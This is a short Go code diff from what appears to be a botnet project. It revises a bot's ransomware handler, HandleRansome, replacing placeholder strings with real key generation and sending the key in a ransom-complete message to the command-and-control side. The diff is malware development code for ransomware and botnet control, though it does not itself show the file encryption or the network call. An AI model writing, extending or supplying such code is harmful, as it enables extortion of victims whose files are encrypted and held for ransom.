@@ -6,6 +6,7 @@ import (
 	"log"
 
 	"github.com/threeaccents/botnet"
+	"github.com/threeaccents/botnet/libs/bytesutil"
 )
 
 //HandleScan is
@@ -39,16 +40,17 @@ func (b *BotService) HandleScan(payload []byte) {
 
 //HandleRansome is
 func (b *BotService) HandleRansome(payload []byte) {
-	if _, err := b.CryptoService.Encrypt([]byte("file to encrypt")); err != nil {
-		// return to CC encrypt failed
+	key, err := botnet.GenerateKey()
+	if err != nil {
+		// return err to cc
 		log.Println(err)
 		return
 	}
 	msg := &ransomCompleteRequest{
 		BotID: b.Bot.ID,
-		Key:   []byte("key we will generate"),
+		Key:   key,
 	}
-	by, err := botnet.Bytes(msg)
+	by, err := bytesutil.Marshal(msg)
 	if err != nil {
 		log.Panic(err)
 	}
